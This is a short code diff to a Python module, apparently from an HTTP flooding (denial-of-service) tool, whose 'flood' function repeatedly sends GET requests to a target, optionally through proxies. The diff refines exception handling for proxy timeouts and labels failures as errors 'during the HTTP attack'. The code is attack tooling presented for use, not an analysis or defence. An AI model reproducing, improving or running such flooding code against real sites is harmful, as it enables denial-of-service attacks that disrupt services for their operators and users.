@@ -6,6 +6,9 @@ import warnings
 
 import requests
 from colorama import Fore  # type: ignore[import]
+from requests.exceptions import ConnectTimeout, ReadTimeout
+
+from tools.crash import CriticalError  # type: ignore[import]
 
 warnings.filterwarnings("ignore", message="Unverified HTTPS request")
 
@@ -49,8 +52,11 @@ def flood(target: str, use_proxy: bool) -> None:
             r = requests.get(target, headers=headers, proxies=proxy, timeout=4)
         else:
             r = requests.get(target, headers=headers, timeout=4)
-    except:
-        pass
+    except (ConnectTimeout, ReadTimeout, OSError):
+        # Ignoring exceptions related to proxy connection
+        return
+    except Exception as err:
+        CriticalError("There was an error during the HTTP attack", err)
     else:
         status = f"{color_code[r.status_code == 200]}Status: [{r.status_code}]"
         payload_size = f"{Fore.CYAN} Requested Data Size: {len(r.content)/1000:>10} KB"
